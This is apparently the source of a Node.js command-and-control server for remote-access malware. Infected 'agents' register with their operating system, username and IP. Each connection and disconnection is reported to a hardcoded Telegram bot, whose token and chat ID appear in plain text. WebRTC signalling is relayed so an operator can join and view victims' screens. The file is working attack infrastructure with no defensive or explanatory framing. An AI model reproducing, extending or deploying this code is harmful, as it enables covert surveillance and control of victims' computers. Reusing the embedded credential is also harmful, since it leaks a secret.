const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const { v4: uuidv4 } = require('uuid');
const path = require('path');
const fs = require('fs');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

// --- CONFIGURATION ---
const TELEGRAM_TOKEN = '9054625238:AAG1uzL9kvH6XxHf1wb6Ga71ZVwheNkS54Y';
const TELEGRAM_CHAT_ID = '6172226452';

let clients = {};
let logBuffer = [];
const MAX_LOGS = 500;

// --- HELPER FUNCTIONS ---
function logToFile(msg) {
 const timestamp = new Date().toISOString();
 const line = `[${timestamp}] ${msg}`;
 logBuffer.push(line);
 if (logBuffer.length > MAX_LOGS) logBuffer.shift();
 console.log(line);
 broadcastLogToAdmins(line);
}

function notifyTelegram(msg) {
 const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(msg)}`;
 require('https').get(url, (res) => {
 let data = '';
 res.on('data', (chunk) => { data += chunk; });
 res.on('end', () => {
 if (res.statusCode !== 200) {
 logToFile(`[TG ERROR] Status: ${res.statusCode}, Body: ${data}`);
 }
 });
 }).on('error', (e) => {
 logToFile(`[TG ERROR] ${e.message}`);
 });
}

function notifyAdmin(id, msg) {
 wss.clients.forEach(client => {
 if (client.readyState === WebSocket.OPEN && client.isAdmin) {
 client.send(JSON.stringify({ targetId: id, type: 'alert', message: msg }));
 }
 });
}

function broadcastToAdmin(sourceId, data) {
 wss.clients.forEach(client => {
 if (client.readyState === WebSocket.OPEN && client.isAdmin) {
 client.send(JSON.stringify({ targetId: sourceId, ...data }));
 }
 });
}

function broadcastLogToAdmins(line) {
 wss.clients.forEach(client => {
 if (client.readyState === WebSocket.OPEN && client.isAdmin) {
 client.send(JSON.stringify({ type: 'system_log', message: line }));
 }
 });
}

// --- HTTP ROUTING ---
app.use(express.static(__dirname)); 

app.get('/', (req, res) => {
 res.writeHead(200, { 'Content-Type': 'text/html' });
 res.end(fs.readFileSync(path.join(__dirname, 'admin.html'), 'utf8'));
});

app.get('/health', (req, res) => {
 res.writeHead(200, { 'Content-Type': 'text/plain' });
 res.end('OK');
});

// --- WEBSOCKET HANDLING ---
wss.on('connection', (ws, req) => {
 let id = uuidv4().substr(0, 8);
 ws.id = id;
 clients[id] = { ws, info: {}, lastSeen: Date.now(), isAdmin: false };

 logToFile(`[+] Client Connected: ${id}`);
 ws.send(JSON.stringify({ type: 'registered', id: id }));

 let pingInterval = setInterval(() => {
 if (ws.readyState === WebSocket.OPEN) {
 ws.ping();
 } else {
 clearInterval(pingInterval);
 }
 }, 25000);

 ws.on('message', (msgRaw) => {
 try {
 const data = JSON.parse(msgRaw);
 logToFile(`[MSG] Received from ${id}: ${data.type}`);

 if (data.type === 'register_admin') {
 clients[id].isAdmin = true;
 logToFile(`[ADMIN] Connected with ID: ${id}`);
 return;
 }

 if (data.type === 'info') {
 // If this is a reconnection with the same ID, update existing client
 if (clients[data.id]) {
 clients[data.id].ws = ws;
 clients[data.id].lastSeen = Date.now();
 clients[data.id].info = data;
 } else {
 clients[id].info = data;
 clients[id].lastSeen = Date.now();
 }
 notifyAdmin(id, `🟢 New User: ${data.os} (${data.user})`);
 broadcastToAdmin(id, data);
 notifyTelegram(`🛡️ NEW AGENT CONNECTED\nID: ${id}\nOS: ${data.os}\nUser: ${data.user}\nIP: ${data.ip || 'Unknown'}`);
 } 
 else if (data.type === 'heartbeat') {
 if (clients[id]) clients[id].lastSeen = Date.now();
 } 
 else if (['offer', 'answer', 'candidate'].includes(data.type)) {
 // Forward signaling data to the specific target
 if (data.targetId && clients[data.targetId]) {
 const targetWs = clients[data.targetId].ws;
 if (targetWs.readyState === WebSocket.OPEN) {
 targetWs.send(JSON.stringify(data));
 }
 }
 } 
 else if (data.type === 'join_all') {
 // Broadcast join request to all other agents
 Object.keys(clients).forEach(cid => {
 if (cid !== id && clients[cid].ws.readyState === WebSocket.OPEN) {
 clients[cid].ws.send(JSON.stringify({
 type: 'join_request',
 from: id,
 timestamp: Date.now()
 }));
 }
 });
 } 
 else if (data.type === 'request_join') {
 // Admin requests to join a specific payload
 const targetId = data.targetId;
 if (clients[targetId]) {
 clients[targetId].ws.send(JSON.stringify({
 type: 'join_request',
 from: id,
 timestamp: Date.now()
 }));
 logToFile(`[ADMIN] Requested join to ${targetId}`);
 notifyTelegram(`🔗 ADMIN REQUESTED JOIN FROM ${targetId}`);
 }
 }
 else {
 if (!clients[id].info && !clients[id].isAdmin) {
 clients[id].info = { os: 'Unknown', user: 'Unknown', ip: 'Unknown' };
 notifyAdmin(id, `📺 Screen Active: ${id}`);
 }
 broadcastToAdmin(id, data);
 }
 } catch (e) {
 logToFile(`[ERR] Message parsing error from ${id}: ${e.message}`);
 }
 });

 ws.on('close', () => {
 delete clients[id];
 notifyAdmin(id, '🔴 User Disconnected');
 notifyTelegram(`🔴 AGENT DISCONNECTED\nID: ${id}`);
 logToFile(`[-] Client Disconnected: ${id}`);
 });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
 logToFile(`C2 Server running on port ${PORT}`);
});
